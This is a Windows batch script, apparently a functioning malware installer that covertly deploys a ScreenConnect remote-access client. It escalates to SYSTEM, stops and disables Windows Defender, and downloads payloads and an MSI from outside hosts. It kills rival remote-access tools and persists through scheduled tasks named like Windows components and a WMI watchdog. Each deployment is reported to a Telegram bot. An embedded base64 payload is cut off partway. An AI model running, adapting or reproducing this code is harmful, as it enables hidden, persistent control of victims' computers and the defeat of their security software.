@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O34 - schtasks via BOOT TR like WucacheOwn + IDENTVER=8
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O34 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O34b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O34" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O34 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O34 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O34: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M24" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S6" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T14" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L13" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O34: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O34/L13: Create like WucacheOwn — BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) — same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O34 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O34 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKcmVtICBPV05fTU9OICBCVUlMRCAyMDI2
MDgwMk0yNApyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50aS1z
aWduYXR1cmUpLCBtdXR1YWwKcmVtICBXTUkrc2NodGFza3MgY2hhaW5zLCBNU0kgZmFsbGJhY2sg
Y2hhaW4sIHN0YXRlLmpzb24sIGRpZ2VzdCBIQi4KcmVtICBBdXRob3JpemVkIGludGVybmFsIGRl
cGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4KcmVtIOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkApzZXRsb2NhbCBFbmFibGVEZWxheWVkRXhwYW5zaW9uCgpzZXQgIktFRVBfRlA9NWY2MDEw
NTc5ODUyZTUwNyIKc2V0ICJBTFRfRlA9Zjg2MWM4MTQwZDQ1MzQyNyIKc2V0ICJXRD1DOlxQcm9n
cmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSIKc2V0ICJFVEw9Qzpc
UHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiCnNldCAiTE9H
PSVXRCVcb3duX21vbi5sb2ciCnNldCAiU1RBVEU9JVdEJVxvd25fbW9uLnN0YXRlIgpzZXQgIkhC
RkxBRz0lV0QlXGhiLmZsYWciCnNldCAiQ1VSTD0lU3lzdGVtUm9vdCVcU3lzdGVtMzJcY3VybC5l
eGUiCnNldCAiVEc9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dp
dGh1Yi1kcm9wL21haW4vdGdfcmVwb3J0LnBzMT90PSVSQU5ET00lJVJBTkRPTSUiCnNldCAiVEcy
PWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL3Rn
X3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIk9XTlNFQz1odHRwczovL3Jhdy5n
aXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fc2VjdXJl
LmNtZD90PSVSQU5ET00lJVJBTkRPTSUiCnNldCAiT1dOU0VDMj1odHRwczovL2Nkbi5qc2RlbGl2
ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fc2VjdXJlLmNtZD90PSVSQU5E
T00lJVJBTkRPTSUiCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
bS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24uY21kP3Q9JVJBTkRPTSUlUkFORE9N
JSIKc2V0ICJPV05NT04yPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRo
dWItZHJvcEBtYWluL293bl9tb24uY21kP3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJPV05MSUI9
aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21h
